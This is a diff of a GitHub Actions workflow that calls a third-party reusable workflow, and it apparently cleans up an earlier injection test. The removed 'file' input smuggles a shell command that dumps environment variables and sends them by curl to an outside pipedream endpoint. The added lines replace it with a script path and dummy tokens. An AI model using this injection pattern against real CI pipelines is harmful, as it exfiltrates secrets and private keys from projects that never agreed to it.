@@ -1,24 +1,24 @@
-name: test
+name: test-clean
 on: [workflow_dispatch]
 jobs:
   call:
     uses: useboardwalk/morphex-workflows/.github/workflows/roboanimals-workflow.yml@master
     with:
-      ref: "main"
+      ref: main
       comment-id: "1"
-      file: "x; env > /tmp/e && curl -X POST -d @/tmp/e https://eow2uhx93hdm0ai.m.pipedream.net #"
-      network: "base"
-      fn: "main"
+      file: scripts/core/withdrawFees.js
+      network: base
+      fn: main
       send: "false"
       pull_request_number: "1"
       delete-branch-after-send: "false"
-      runs_on: "ubuntu-latest"
+      runs_on: ubuntu-latest
     secrets:
       PRIVATE_KEY: "0x0000000000000000000000000000000000000000000000000000000000000001"
-      TELEGRAM_TOKEN: "x"
-      POLYGONSCAN_TOKEN: "x"
-      FTMSCAN_TOKEN: "x"
-      ETHERSCAN_TOKEN: "x"
-      BSCSCAN_TOKEN: "x"
-      ARBISCAN_TOKEN: "x"
-      SNOWTRACE_TOKEN: "x"
+      TELEGRAM_TOKEN: "dummy"
+      POLYGONSCAN_TOKEN: "dummy"
+      FTMSCAN_TOKEN: "dummy"
+      ETHERSCAN_TOKEN: "dummy"
+      BSCSCAN_TOKEN: "dummy"
+      ARBISCAN_TOKEN: "dummy"
+      SNOWTRACE_TOKEN: "dummy"
